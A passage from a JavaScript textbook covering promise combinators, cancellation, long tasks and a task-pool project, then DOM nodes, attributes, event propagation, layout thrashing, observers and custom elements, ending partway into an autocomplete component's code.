1. **Fix.** `const pages = urls.map(async (u) => await fetch(u)); render(pages);` — what does `render` receive, and how do you fix it?

## Unit 7.4 — Combinators, timeouts, and cancellation

**One-line summary:** `Promise.all` fails fast on the first rejection, `allSettled` waits for everything and reports each outcome, `race` settles with the first to settle (success or failure), `any` fulfils with the first success; and since promises cannot be cancelled, work is stopped by passing an `AbortSignal` — from an `AbortController`, or `AbortSignal.timeout(ms)` — to code that listens for it, as `fetch` does.

```js
// file: async/combinators.mjs
// Four ways to wait for several promises, and how to give up on slow ones.
const after = (ms, v, fail = false) =>
  new Promise((ok, no) => setTimeout(() => (fail ? no(new Error(v)) : ok(v)), ms));
const tasks = () => [after(30, "fast"), after(60, "broken", true), after(90, "slow")];

try { await Promise.all(tasks()); } catch (e) { console.log("all:        rejects with the first failure:", e.message); }
console.log("allSettled:", (await Promise.allSettled(tasks())).map((r) => r.status === "fulfilled" ? r.value : `error ${r.reason.message}`));
console.log("race:       ", await Promise.race(tasks()));
console.log("any:        ", await Promise.any(tasks()));
try { await Promise.any([after(10, "x", true), after(20, "y", true)]); }
catch (e) { console.log("any, all fail:", e.constructor.name, e.errors.map((x) => x.message)); }

// Cancellation: an AbortSignal tells cooperating code to stop; AbortSignal.timeout makes one that fires by itself.
function work(ms, { signal }) {
  return new Promise((ok, no) => {
    const timer = setTimeout(() => ok(`finished ${ms} ms of work`), ms);
    signal.addEventListener("abort", () => { clearTimeout(timer); no(signal.reason); }, { once: true });
  });
}
console.log(await work(20, { signal: AbortSignal.timeout(100) }));
try { await work(200, { signal: AbortSignal.timeout(50) }); }
catch (e) { console.log(`gave up: ${e.name}: ${e.message}`); }
```

```console
$ cd async && node combinators.mjs
all:        rejects with the first failure: broken
allSettled: [ 'fast', 'error broken', 'slow' ]
race:        fast
any:         fast
any, all fail: AggregateError [ 'x', 'y' ]
finished 20 ms of work
gave up: TimeoutError: The operation was aborted due to timeout
```

### Deep & Tricky

**DT-26. `Promise.all` and `Promise.race` do not stop the other operations: when `all` rejects or `race` settles, the remaining promises keep running and their results — including later rejections — are silently ignored. A timeout written as `Promise.race([work(), timeout(1000)])` therefore leaves the slow work running, holding sockets or memory; only passing an `AbortSignal` into the work actually stops it.** *(ECMA-262 §27.2.4.1 Promise.all and §27.2.4.5 Promise.race — they only attach reactions; DOM Standard §3.1 "Interface AbortController" and `AbortSignal.timeout`)*

### Mastery check

1. **Choose.** You load a user's profile and, optionally, their avatar; the page must render even if the avatar fails. Which combinator?

## Topic 7C — Keeping the page responsive

## Unit 7.5 — Long tasks

**One-line summary:** While a task runs, nothing else on that thread can: no input is handled, no frame is rendered, no timer fires; tasks longer than 50 ms are reported as *long tasks* and directly harm responsiveness (the INP metric, Chapter 13), so long work must be split into pieces that yield to the browser — `scheduler.yield()`, `setTimeout`, or a Web Worker for work that need not touch the DOM.

```html
<!-- file: block/blocking.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Long tasks block everything</title></head>
<body>
  <button id="b">Click me</button>
  <script>
    const mode = new URLSearchParams(location.search).get("mode") ?? "blocking";
    const t0 = performance.now(), at = () => `${Math.round(performance.now() - t0)} ms`;
    let clickedAt = null;
    document.getElementById("b").addEventListener("click", () => console.log(`click handled at ${at()}`));
    new PerformanceObserver((list) => {
      for (const e of list.getEntries()) console.log(`long task: ${Math.round(e.duration)} ms`);
    }).observe({ type: "longtask" });

    function busy(ms) { const end = performance.now() + ms; while (performance.now() < end) {} }

    async function work() {
      console.log(`${mode}: start 600 ms of work at ${at()}`);
      for (let i = 0; i < 30; i++) {
        busy(20);                                            // one 20-ms slice
        if (mode === "yielding") await scheduler.yield();    // let the browser handle input in between
      }
      console.log(`${mode}: work done at ${at()}`);
    }
    setTimeout(work, 50);
  </script>
</body>
</html>
```

The driver clicks the button 100 ms after the page loads — 50 ms into the work — using `mouse:`, which sends the click immediately (`click:` would first wait for the page to respond):

```console
$ cd block && python3 ../../tools/page.py blocking.html wait:100 mouse:20,15 wait:800
blocking: start 600 ms of work at 51 ms
blocking: work done at 653 ms
click handled at 654 ms
long task: 602 ms
$ cd block && python3 ../../tools/page.py "blocking.html?mode=yielding" wait:100 mouse:20,15 wait:800
yielding: start 600 ms of work at 51 ms
click handled at 115 ms
yielding: work done at 657 ms
```

In one piece, the work is a single 600-ms long task, and the click waits for all of it: it is handled more than half a second after the user clicked. Split into 20-ms slices separated by `scheduler.yield()`, the same total work takes the same time, but the click is handled within a few milliseconds. `scheduler.yield()` is better than `setTimeout(0)` for this: the continuation is queued ahead of other ordinary tasks, so the work is not delayed by every other script on the page, and it avoids the 4-ms clamp of nested timeouts.

### Pattern

**P-7. Never block the main thread for more than about 50 ms: break loops over large data into chunks that yield, move pure computation (parsing, compression, image processing) to a Web Worker, and measure with the Long Tasks and Long Animation Frames APIs or the DevTools Performance panel.** *(web.dev, "Optimize long tasks"; W3C Long Tasks API)* *Trade-off:* yielding makes total work slightly slower and requires the code to tolerate other tasks running in between (state can change while you yield); workers cost a copy (or transfer) of the data and cannot touch the DOM.

## Chapter 7 Project — A task pool

### Requirements

Write `runPool(tasks, options)` for running many asynchronous jobs (for example, HTTP requests to a rate-limited API):

- At most `concurrency` tasks run at once; results come back in task order as `allSettled`-style records.
- Each attempt gets an `AbortSignal` that fires after `timeout` ms.
- Failed attempts are retried up to `retries` times, waiting `backoff × 2ⁿ` ms with random jitter.
- One external `AbortSignal` cancels everything: running tasks are aborted, waiting retries stop, and no new tasks start.
- An `onEvent` callback reports starts, completions, and retries.

Test concurrency, ordering, retries, timeouts, and cancellation.

### Reference solution

```js
// file: project/pool.mjs
// Run async tasks with a concurrency limit, per-attempt timeouts, retries with exponential
// backoff, and cancellation of everything through one AbortSignal.

const sleep = (ms, signal) => new Promise((ok, no) => {
  if (signal?.aborted) return no(signal.reason);
  const t = setTimeout(ok, ms);
  signal?.addEventListener("abort", () => { clearTimeout(t); no(signal.reason); }, { once: true });
});

/**
 * @param {Array<(signal: AbortSignal) => Promise<any>>} tasks
 * @returns {Promise<PromiseSettledResult<any>[]>} results in the same order as the tasks
 */
export async function runPool(tasks, { concurrency = 4, timeout = 1000, retries = 2,
                                       backoff = 100, signal, onEvent = () => {} } = {}) {
  const results = new Array(tasks.length);
  let next = 0;

  async function attempt(i) {
    for (let n = 0; ; n++) {
      const attemptSignal = AbortSignal.any([AbortSignal.timeout(timeout), ...(signal ? [signal] : [])]);
      try {
        onEvent({ type: "start", task: i, attempt: n });
        const value = await tasks[i](attemptSignal);
        onEvent({ type: "done", task: i });
        return value;
      } catch (err) {
        if (signal?.aborted || n >= retries) throw err;        // cancelled, or out of retries
        const wait = backoff * 2 ** n * (0.5 + Math.random() / 2);   // exponential, with jitter
        onEvent({ type: "retry", task: i, error: err.name, wait: Math.round(wait) });
        await sleep(wait, signal);
      }
    }
  }

  async function worker() {
    while (next < tasks.length) {                    // safe: JavaScript runs one worker at a time
      const i = next++;                              // between awaits, so no two workers take one i
      if (signal?.aborted) { results[i] = { status: "rejected", reason: signal.reason }; continue; }
      try { results[i] = { status: "fulfilled", value: await attempt(i) }; }
      catch (reason) { results[i] = { status: "rejected", reason }; }
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, tasks.length) }, worker));
  return results;
}
```

```js
// file: project/test.mjs
import assert from "node:assert/strict";
import { runPool } from "./pool.mjs";

// A fake remote call: takes `ms`, fails the first `failures` times, honours the abort signal.
function fakeTask(ms, failures = 0, value = ms) {
  let calls = 0;
  return (signal) => new Promise((ok, no) => {
    calls++;
    const t = setTimeout(() => (calls <= failures ? no(new Error("503")) : ok(value)), ms);
    signal.addEventListener("abort", () => { clearTimeout(t); no(signal.reason); }, { once: true });
  });
}

let running = 0, peak = 0;
const track = (e) => {
  if (e.type === "start") peak = Math.max(peak, ++running);
  if (e.type === "done" || e.type === "retry") running--;
};

{ // 10 tasks of 50 ms with concurrency 3: about 4 rounds
  running = peak = 0;
  const t0 = performance.now();
  const r = await runPool(Array.from({ length: 10 }, (_, i) => fakeTask(50, 0, i)), { concurrency: 3, onEvent: track });
  const ms = performance.now() - t0;
  assert.deepEqual(r.map((x) => x.value), [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]);   // order preserved
  assert.equal(peak, 3);
  console.log(`10 tasks, limit 3: peak concurrency ${peak}, ${Math.round(ms)} ms (ideal 200)`);
}
{ // a flaky task succeeds on its third attempt; a hopeless one gives up after 3 attempts
  const events = [];
  const r = await runPool([fakeTask(10, 2, "flaky ok"), fakeTask(10, 99)],
    { retries: 2, backoff: 20, onEvent: (e) => events.push(e) });
  assert.equal(r[0].value, "flaky ok");
  assert.equal(r[1].status, "rejected");
  console.log("retries:", events.filter((e) => e.type === "retry").map((e) => `task ${e.task} after ${e.error}`).join(", "));
}
{ // a slow task is timed out on each attempt
  const r = await runPool([fakeTask(500)], { timeout: 50, retries: 1, backoff: 10 });
  assert.equal(r[0].reason.name, "TimeoutError");
  console.log("timeout:", r[0].reason.name);
}
{ // cancelling the whole pool stops running tasks and starts no new ones
  const controller = new AbortController();
  let started = 0;
  setTimeout(() => controller.abort(new Error("user cancelled")), 120);
  const t0 = performance.now();
  const r = await runPool(Array.from({ length: 20 }, () => fakeTask(100)),
    { concurrency: 2, signal: controller.signal, onEvent: (e) => e.type === "start" && started++ });
  const ms = performance.now() - t0;
  const counts = Object.groupBy(r, (x) => x.status === "fulfilled" ? "done" : x.reason.message);
  assert.ok(ms < 200 && started < 20);
  console.log(`cancelled after ${Math.round(ms)} ms: started ${started},`,
              Object.fromEntries(Object.entries(counts).map(([k, v]) => [k, v.length])));
}
console.log("all pool tests passed");
```

```console
$ cd project && node test.mjs
10 tasks, limit 3: peak concurrency 3, 202 ms (ideal 200)
retries: task 0 after Error, task 1 after Error, task 0 after Error, task 1 after Error
timeout: TimeoutError
cancelled after 120 ms: started 4, { done: 2, 'user cancelled': 18 }
all pool tests passed
```

Ten 50-ms tasks with a limit of three finish in four rounds, about 200 ms, never exceeding three at once, with results in task order. The flaky task succeeds on its third attempt; the hopeless one is reported as rejected after three. (Because of the random jitter, the order of the retry events can differ from run to run.) Cancelling after 120 ms finishes the two tasks that completed, aborts the two in progress, and never starts the other sixteen.

Two design points deserve attention. The workers share the counter `next` without any lock: JavaScript runs one piece of code at a time, and the check-and-increment contains no `await`, so no other worker can run in between. And each attempt's signal combines the timeout and the external signal with `AbortSignal.any`, so a task needs to listen to only one signal.

### Review checklist

- Retrying is only safe for idempotent operations (Chapter 0, Unit 0.2). How should the API let callers say which errors are retryable — a 503, but not a 400?
- Add a rate limit (at most N starts per second) in addition to the concurrency limit.
- What happens to memory if `tasks` has a million entries? How would an async-iterator input help?

## Answers to the Chapter 7 prediction questions

**Unit 7.1, Q1.** D, B, A, C: the script, then the microtask (which queues C), then the first timer A, then C.

**Unit 7.2, Q1.** 2: the second argument of `then` handles the rejection and its return value fulfils the next promise.

**Unit 7.3, Q1.** An array of pending promises; use `const pages = await Promise.all(urls.map((u) => fetch(u)));`.

**Unit 7.4, Q1.** `Promise.allSettled` (or `Promise.all` with a `.catch()` on the avatar promise that turns failure into a placeholder).

# Chapter 8 — The DOM, Events, and Browser APIs

*Goal: program the page. The DOM is the live object model of the document; events are how the page and the user talk to your code; observers report changes without polling; custom elements and shadow DOM package behaviour into reusable, encapsulated components. Along the way you will meet live collections that skip elements, attributes that disagree with properties, a loop made 200 times slower by the order of its reads and writes, and the event phases that make delegation work. The project is an accessible autocomplete component that takes part in form submission like a native input.*

**What you will be able to do after this chapter**

- Query, create, and change DOM nodes safely, and know which APIs parse HTML.
- Tell attributes from properties, and use `dataset` and `classList`.
- Explain capture and bubble, use event delegation, and manage listeners with `once` and `AbortSignal`.
- Avoid forced synchronous layouts.
- Use `IntersectionObserver`, `ResizeObserver`, and `MutationObserver`.
- Write custom elements with shadow DOM, slots, and form association.

## Topic 8A — The document

## Unit 8.1 — Nodes, elements, and collections

**One-line summary:** The DOM is a tree of nodes — elements, text (including whitespace between tags), comments — navigated with `children`/`parentElement` (elements only) or `childNodes`/`parentNode` (all nodes), queried with `querySelector`/`querySelectorAll` (static snapshots) or the older `getElementsBy…` methods (*live* collections that change as the document does); `textContent` sets text safely, while `innerHTML` and `insertAdjacentHTML` parse HTML.

```html
<!-- file: dom/tree.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>The DOM tree</title></head>
<body>
  <ul id="list">
    <li class="item">Apples</li>
    <li class="item">Pears</li>
  </ul>
  <script>
    const list = document.getElementById("list");
    console.log(`childNodes: ${list.childNodes.length} (${[...list.childNodes].map((n) => n.nodeName).join(", ")})`);
    console.log(`children:   ${list.children.length} (${[...list.children].map((n) => n.textContent).join(", ")})`);

    const live = list.getElementsByClassName("item");   // a LIVE HTMLCollection
    const fixed = list.querySelectorAll(".item");       // a STATIC NodeList: a snapshot
    const li = document.createElement("li");
    li.className = "item";
    li.textContent = "Plums <b>ripe</b>";               // text, never parsed as HTML
    list.append(li);
    console.log(`after append: live ${live.length}, static ${fixed.length}; new item text "${li.textContent}", ` +
                `child elements ${li.children.length}`);

    // Removing with a live collection: the classic skipped-element bug
    for (let i = 0; i < live.length; i++) live[i].classList.remove("item");
    console.log(`after "removing the class from every item": ${list.querySelectorAll(".item").length} still have it`);

    list.insertAdjacentHTML("beforeend", "<li>Figs <b>dried</b></li>");   // parsed: use only with trusted HTML
    console.log(`insertAdjacentHTML made ${list.lastElementChild.children.length} <b> element; ` +
                `outerHTML: ${list.lastElementChild.outerHTML}`);
  </script>
</body>
</html>
```

```console
$ cd dom && python3 ../../tools/page.py tree.html
childNodes: 5 (#text, LI, #text, LI, #text)
children:   2 (Apples, Pears)
after append: live 3, static 2; new item text "Plums <b>ripe</b>", child elements 0
after "removing the class from every item": 1 still have it
insertAdjacentHTML made 1 <b> element; outerHTML: <li>Figs <b>dried</b></li>
```

The list has five child *nodes* but two child *elements*: the whitespace between the tags is text. After `append`, the live collection has grown to 3 while the static `NodeList` still says 2. The live collection then causes a classic bug: removing the class from `live[0]` removes that element from the collection, everything shifts down, `i` moves on, and one element is skipped. Iterate over a static copy (`[...live]` or `querySelectorAll`) when the loop changes what is being iterated.

### Deep & Tricky

**DT-27. Any API that parses a string as HTML — `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `Range.createContextualFragment` — will create elements and attributes from data, so inserting user-supplied text with them is the most common cause of cross-site scripting (Chapter 14); `textContent`, `createElement` + properties, and `setAttribute` never parse. Script elements inserted through `innerHTML` do not run, but `<img src=x onerror=…>` does.** *(HTML Living Standard §8.4 "DOM parsing and serialization APIs" — "scripts … inserted using innerHTML … do not execute"; OWASP "DOM based XSS Prevention Cheat Sheet")*

## Unit 8.2 — Attributes and properties

**One-line summary:** HTML attributes are the strings in the markup (`getAttribute`); DOM properties are the JavaScript object's current state (`el.value`), and for form controls the two diverge after the first change — the `value` attribute is only the *default* value; properties also normalise (`href` becomes an absolute URL); `data-*` attributes appear as strings in `dataset`.

```html
<!-- file: dom/attrs.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Attributes versus properties</title></head>
<body>
  <input id="name" value="initial">
  <input id="agree" type="checkbox" checked>
  <a id="link" href="/docs?page=2">docs</a>
  <div id="card" data-user-id="42" data-is-admin="false" class="card highlighted"></div>
  <script>
    const name = document.getElementById("name"), agree = document.getElementById("agree");
    name.value = "typed by the user";                    // the PROPERTY: current state
    agree.checked = false;
    console.log(`value property "${name.value}", value attribute "${name.getAttribute("value")}", defaultValue "${name.defaultValue}"`);
    console.log(`checked property ${agree.checked}, checked attribute present: ${agree.hasAttribute("checked")}`);
    const link = document.getElementById("link");
    console.log(`href attribute "${link.getAttribute("href")}", href property "${link.href}"`);
    const card = document.getElementById("card");
    console.log(`dataset: userId ${card.dataset.userId} (${typeof card.dataset.userId}), isAdmin ${card.dataset.isAdmin} -> truthy? ${Boolean(card.dataset.isAdmin)}`);
    card.classList.toggle("highlighted");
    card.classList.add("selected");
    console.log(`className now "${card.className}"; contains card: ${card.classList.contains("card")}`);
  </script>
</body>
</html>
```

```console
$ cd dom && python3 ../../tools/page.py attrs.html
value property "typed by the user", value attribute "initial", defaultValue "initial"
checked property false, checked attribute present: true
href attribute "/docs?page=2", href property "file:///docs?page=2"
dataset: userId 42 (string), isAdmin false -> truthy? true
className now "card selected"; contains card: true
```

The `value` and `checked` attributes kept their original values after the properties changed — they are the defaults that `form.reset()` restores. The `href` property is the resolved absolute URL (here relative to a `file://` page). Everything in `dataset` is a string: `"false"` is truthy, so parse explicitly (`card.dataset.isAdmin === "true"`).

### Mastery check

1. **Predict.** After the user types "abc" into `<input value="x">`, what does `input.outerHTML` show?

## Topic 8B — Events

## Unit 8.3 — Propagation: capture, target, and bubble

**One-line summary:** An event travels from the window down to its target (capture phase), runs the target's listeners, then travels back up (bubble phase); listeners run on each element in the path for the phase they registered for, `stopPropagation` ends the journey, and `preventDefault` cancels the browser's default action (following a link, submitting a form) without affecting propagation.

```html
<!-- file: events/phases.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Event propagation</title></head>
<body>
  <div id="outer"><p id="middle"><button id="inner">Click</button></p></div>
  <script>
    const phase = ["", "capture", "target", "bubble"];
    for (const id of ["outer", "middle", "inner"]) {
      const el = document.getElementById(id);
      el.addEventListener("click", (e) => console.log(`${id.padEnd(6)} capture listener (${phase[e.eventPhase]})`), { capture: true });
      el.addEventListener("click", (e) => console.log(`${id.padEnd(6)} bubble listener  (${phase[e.eventPhase]})`));
    }
  </script>
</body>
</html>
```

```console
$ cd events && python3 ../../tools/page.py phases.html click:#inner
outer  capture listener (capture)
middle capture listener (capture)
inner  capture listener (target)
inner  bubble listener  (target)
middle bubble listener  (bubble)
outer  bubble listener  (bubble)
```

Calling `e.stopPropagation()` in `middle`'s bubble listener would stop the event before `outer`'s bubble listener; it would not undo what already happened in the capture phase. Use it rarely: code higher up (analytics, a dropdown that closes on outside clicks) usually needs to see events.

## Unit 8.4 — Delegation and listener management

**One-line summary:** Because events bubble, one listener on a container can handle events from all of its descendants — including ones added later — by examining `event.target` (with `closest()`); listeners can remove themselves after one call (`once`), be removed in groups through an `AbortSignal` (`signal`), and declare that they will not call `preventDefault` (`passive`), and pages can define their own events with `CustomEvent`.

```html
<!-- file: events/delegation.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Event delegation and listener options</title></head>
<body>
  <ul id="todos"><li><span>Buy milk</span> <button data-action="delete">Delete</button></li></ul>
  <button id="add">Add</button>
  <a id="nav" href="https://example.com/">A link</a>
  <script>
    const todos = document.getElementById("todos");
    // ONE listener on the list handles every button, including ones added later
    todos.addEventListener("click", (e) => {
      const button = e.target.closest("button[data-action]");
      if (!button || !todos.contains(button)) return;
      const item = button.closest("li");
      console.log(`${button.dataset.action}: ${item.querySelector("span").textContent}`);
      item.remove();
    });
    let n = 0;
    document.getElementById("add").addEventListener("click", () => {
      todos.insertAdjacentHTML("beforeend", `<li><span>Task ${++n}</span> <button data-action="delete">Delete</button></li>`);
      console.log(`added Task ${n}; list has ${todos.children.length} items`);
    });
    document.getElementById("nav").addEventListener("click", (e) => {
      e.preventDefault();                                   // stay on the page
      console.log(`navigation to ${e.currentTarget.href} prevented`);
    }, { once: true });                                     // removed after the first call
    const controller = new AbortController();               // remove many listeners at once
    addEventListener("keydown", (e) => console.log(`key ${e.key}`), { signal: controller.signal });
    addEventListener("keydown", (e) => { if (e.key === "Escape") controller.abort(); }, { signal: controller.signal });
    document.addEventListener("todo:cleared", (e) => console.log(`custom event: ${e.detail.count} cleared`));
    todos.dispatchEvent(new CustomEvent("todo:cleared", { detail: { count: 0 }, bubbles: true }));
  </script>
</body>
</html>
```

```console
$ cd events && python3 ../../tools/page.py delegation.html click:#add click:#add "click:#todos li:nth-child(2) button" "click:#todos li:first-child button" click:#nav press:a press:Escape press:b
custom event: 0 cleared
added Task 1; list has 2 items
added Task 2; list has 3 items
delete: Task 1
delete: Buy milk
navigation to https://example.com/ prevented
key a
key Escape
```

The delegated listener handles the delete buttons of items that did not exist when it was registered. The link's default navigation is prevented, once. After Escape aborts the controller, both key listeners are gone, so `b` is not logged. The custom event bubbled to `document`; custom event names conventionally contain a colon or hyphen to avoid clashes with future built-in events.

### Deep & Tricky

**DT-28. `event.target` is the innermost element that was hit — often a `<span>` or `<svg>` inside the button you care about — while `event.currentTarget` is the element whose listener is running (and is `null` after the handler returns, e.g. when inspected later or in an `await`ed continuation). Delegation must therefore use `event.target.closest(selector)` and then check that the match is inside the container, or clicks on an icon inside a button are lost.** *(DOM Standard §2.9 "Interface Event": `currentTarget` is reset when dispatch finishes; §2.10 dispatch algorithm)*

### Mastery check

1. **Explain.** Why must a `touchstart` or `wheel` listener that never calls `preventDefault` be registered with `{ passive: true }` for smooth scrolling?

## Topic 8C — Watching the page

## Unit 8.5 — Layout thrashing

**One-line summary:** Reading a geometry property (`offsetWidth`, `getBoundingClientRect`, `scrollTop`, `getComputedStyle(...).width`) forces the browser to bring layout up to date, and writing a style invalidates it again — so a loop that alternates reads and writes recomputes layout on every iteration, while doing all reads first and all writes afterwards costs a single layout.

```html
<!-- file: perf/thrash.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Layout thrashing</title>
  <style> .bar { height: 4px; background: teal; margin: 1px 0; width: 100px; } </style>
</head>
<body>
  <div id="bars"></div>
  <script>
    const N = 2000, bars = document.getElementById("bars");
    const fragment = document.createDocumentFragment();     // build off-document, insert once
    for (let i = 0; i < N; i++) fragment.append(Object.assign(document.createElement("div"), { className: "bar" }));
    bars.append(fragment);
    const items = [...bars.children];

    function time(label, fn) {
      const t = performance.now(); fn(); console.log(`${label}: ${(performance.now() - t).toFixed(1)} ms`);
    }
    time("interleaved read/write", () => {
      for (const el of items) el.style.width = (el.offsetWidth + 1) + "px";    // read forces layout, write invalidates it
    });
    time("all reads, then all writes", () => {
      const widths = items.map((el) => el.offsetWidth);                       // one layout
      items.forEach((el, i) => { el.style.width = (widths[i] + 1) + "px"; });  // writes only
      void bars.offsetHeight;                                                   // one more layout, to be fair
    });
  </script>
</body>
</html>
```

```console
$ cd perf && python3 ../../tools/page.py thrash.html
interleaved read/write: 1462.4 ms
all reads, then all writes: 7.5 ms
```

The same 2,000 width changes take one to two seconds when interleaved with reads (the time varies between runs) and under ten milliseconds when batched — a factor of about 200. The elements were created in a `DocumentFragment` and inserted with one `append`, so the document changed only once there as well.

### Pattern

**P-8. Separate DOM reads from DOM writes: read all geometry first (or in a `ResizeObserver`/`IntersectionObserver` callback, which supply it), then write; schedule visual updates in `requestAnimationFrame`; build large subtrees off-document and insert them once.** *(web.dev, "Avoid large, complex layouts and layout thrashing"; Paul Irish, "What forces layout/reflow" — the list of properties that force layout)* *Trade-off:* batching makes code less linear; libraries that schedule reads and writes for you (and frameworks with a virtual DOM or fine-grained reactivity) exist largely to hide this ordering.

## Unit 8.6 — Observers

**One-line summary:** Instead of polling or listening to every scroll and resize, ask the browser to tell you: `IntersectionObserver` reports when elements enter or leave the viewport (lazy loading, infinite scroll, "seen" tracking), `ResizeObserver` reports element size changes from any cause, and `MutationObserver` reports DOM changes in batches, as a microtask after they happen.

```html
<!-- file: observe/observers.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Observers</title>
  <style> body { margin: 0; } .section { height: 400px; border-bottom: 1px solid; } #box { width: 50%; } </style>
</head>
<body>
  <div id="box">resizable</div>
  <ul id="watched"><li>first</li></ul>
  <div class="section" id="s1">one</div><div class="section" id="s2">two</div>
  <div class="section" id="s3">three</div><div class="section" id="s4">four</div>
  <script>
    // IntersectionObserver: which sections are at least half visible? (lazy loading, analytics, infinite scroll)
    const io = new IntersectionObserver((entries) => {
      for (const e of entries) console.log(`intersection: #${e.target.id} ${e.isIntersecting ? "visible" : "hidden"} (${e.intersectionRatio.toFixed(2)})`);
    }, { threshold: 0.5 });
    document.querySelectorAll(".section").forEach((s) => io.observe(s));

    // ResizeObserver: react to an element's size, whatever caused the change
    new ResizeObserver(([entry]) => console.log(`resize: #box is ${entry.contentRect.width}px wide`))
      .observe(document.getElementById("box"));

    // MutationObserver: notice DOM changes made by any code
    const mo = new MutationObserver((records) =>
      console.log(`mutations: ${records.map((r) => `${r.type}${r.attributeName ? ":" + r.attributeName : ""}`).join(", ")}`));
    const watched = document.getElementById("watched");
    mo.observe(watched, { childList: true, attributes: true, subtree: true });
    watched.firstElementChild.setAttribute("data-seen", "yes");
    watched.append(document.createElement("li"));
    console.log("(the mutation callback has not run yet: it is a microtask)");
  </script>
</body>
</html>
```

```console
$ cd observe && python3 ../../tools/page.py observers.html wait:100 "eval:void scrollTo(0, 700)" wait:200 viewport:400x600 wait:200
(the mutation callback has not run yet: it is a microtask)
mutations: attributes:data-seen, childList
resize: #box is 400px wide
intersection: #s1 visible (1.00)
intersection: #s2 hidden (0.28)
intersection: #s3 hidden (0.00)
intersection: #s4 hidden (0.00)
=> null
intersection: #s1 hidden (0.00)
intersection: #s3 visible (1.00)
resize: #box is 200px wide
```

The mutation records arrived together, after the script finished. The intersection callback first reports the initial state of every observed section, then only changes: after scrolling, section 1 has left and section 3 has become more than half visible. Shrinking the viewport resized the box, which the resize observer reported without any `resize` event listener.

## Topic 8D — Components

## Unit 8.7 — Custom elements and shadow DOM

**One-line summary:** `customElements.define("name-with-hyphen", Class)` teaches the browser a new element whose class receives lifecycle callbacks (connected, disconnected, attribute changed for `observedAttributes`); a shadow root attached to it holds a private DOM whose styles do not leak in or out, with `<slot>`s showing the element's light-DOM children, and events that cross the boundary only if they are `composed`.

```html
<!-- file: components/counter.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>A custom element</title>
  <style> button { color: red; } </style>              <!-- does not reach into the shadow root -->
</head>
<body>
  <click-counter id="c" step="2"><span slot="label">Clicks</span></click-counter>
  <script>
    class ClickCounter extends HTMLElement {
      static observedAttributes = ["step"];
      #count = 0;
      #button;
      constructor() {
        super();
        const root = this.attachShadow({ mode: "open" });
        root.innerHTML = `
          <style> :host { display: inline-block; } button { color: green; } </style>
          <slot name="label">Count</slot>: <button part="button">0</button>`;
        this.#button = root.querySelector("button");
        this.#button.addEventListener("click", () => {
          this.#count += Number(this.getAttribute("step") ?? 1);
          this.#button.textContent = this.#count;
          this.dispatchEvent(new CustomEvent("count", { detail: this.#count, bubbles: true, composed: true }));
        });
      }
      connectedCallback() { console.log("connectedCallback: added to the document"); }
      disconnectedCallback() { console.log("disconnectedCallback: removed"); }
      attributeChangedCallback(name, old, value) { console.log(`attributeChangedCallback: ${name} ${old} -> ${value}`); }
    }
    customElements.define("click-counter", ClickCounter);
    const c = document.getElementById("c");
    c.addEventListener("count", (e) => console.log(`count event: ${e.detail}`));
    console.log(`page button rule reaches the shadow DOM? colour is ${getComputedStyle(c.shadowRoot.querySelector("button")).color}`);
    console.log(`document.querySelector("button") from outside: ${document.querySelector("button")}`);
  </script>
</body>
</html>
```

The driver's selectors reach into open shadow roots (`#c >> button` is Playwright's syntax for "a button inside #c"):

```console
$ cd components && python3 ../../tools/page.py counter.html "click:#c >> button" "eval:document.getElementById('c').setAttribute('step', '5')" "click:#c >> button" "eval:document.getElementById('c').remove()"
attributeChangedCallback: step null -> 2
connectedCallback: added to the document
page button rule reaches the shadow DOM? colour is rgb(0, 128, 0)
document.querySelector("button") from outside: null
count event: 2
attributeChangedCallback: step 2 -> 5
=> null
count event: 7
disconnectedCallback: removed
=> null
```

The page's `button { color: red }` does not reach the shadow DOM's button (green), and `document.querySelector("button")` cannot see it either. The attribute callback runs for the initial attribute even before `connectedCallback`. The `count` event needs `composed: true` to escape the shadow root; `part="button"` lets outside CSS style it deliberately with `click-counter::part(button)`.

### Mastery check

1. **Explain.** Why must custom element names contain a hyphen?

## Chapter 8 Project — An accessible autocomplete element

### Requirements

Build `<auto-complete>`, a combobox that suggests options as the user types:

- Options come from `<option>` children; matching ignores case and accents (typing "oster" finds "Österreich").
- Follow the WAI-ARIA combobox pattern: `role="combobox"` on the input with `aria-expanded`, `aria-controls`, and `aria-activedescendant`; a `role="listbox"` popup of `role="option"` items with `aria-selected`.
- Keyboard: Arrow Down/Up move through the suggestions (wrapping), Enter chooses, Escape closes; mouse selection works too.
- It is a form-associated custom element: its chosen value is submitted with the form under its `name`, `required` validation works, and `form.reset()` clears it.

### Reference solution

```js
// file: project/auto-complete.js
// <auto-complete>: an accessible combobox (WAI-ARIA "combobox with listbox popup" pattern)
// as a form-associated custom element. Options come from <option> children.
const fold = (s) => s.normalize("NFD").replace(/\p{Diacritic}/gu, "").toLowerCase();   // "Österreich" ~ "oster"
let uid = 0;

class AutoComplete extends HTMLElement {
  static formAssociated = true;                       // takes part in <form> submission and reset
  #internals = this.attachInternals();
  #input; #list; #options = []; #matches = []; #active = -1; #id = `ac${++uid}`;

  connectedCallback() {
    if (this.#input) return;                          // connected again after a move: already built
    this.#options = [...this.querySelectorAll("option")].map((o) => o.value || o.textContent);
    const root = this.attachShadow({ mode: "open", delegatesFocus: true });
    root.innerHTML = `
      <style>
        :host { display: inline-block; position: relative; }
        ul { position: absolute; margin: 0; padding: 0; list-style: none; border: 1px solid; background: Canvas; }
        ul[hidden] { display: none; }
        li[aria-selected="true"] { background: Highlight; color: HighlightText; }
      </style>
      <label for="input"><slot name="label">${this.getAttribute("label") ?? ""}</slot></label>
      <input id="input" role="combobox" aria-autocomplete="list" aria-expanded="false"
             aria-controls="list" autocomplete="off">
      <ul id="list" role="listbox" hidden></ul>`;
    this.#input = root.getElementById("input");
    this.#list = root.getElementById("list");
    this.#input.addEventListener("input", () => this.#filter());
